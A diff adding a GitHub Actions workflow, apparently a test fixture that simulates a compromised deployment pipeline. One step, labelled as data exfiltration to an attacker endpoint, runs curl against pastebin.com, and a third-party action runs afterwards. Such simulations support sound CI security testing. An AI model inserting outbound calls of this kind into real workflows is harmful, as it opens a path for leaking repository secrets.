@@ -1,0 +1,19 @@
+name: Compromised Deploy 2
+on:
+  workflow_dispatch:
+jobs:
+  build:
+    name: Deploy2
+    runs-on: ubuntu-latest
+    steps:
+      - name: Code Checkout
+        uses: actions/checkout@v2
+        with:
+          fetch-depth: 2
+      - name: Data Exfiltration To Attacker Controller Endpoint
+        run: "curl pastebin.com  --connect-timeout 5  || true"
+
+      - name: 1 Docker Action ashishkurmi/hello-action
+        uses: ashishkurmi/hello-action@main
+        env:
+          SLEEPINSECONDS: 5
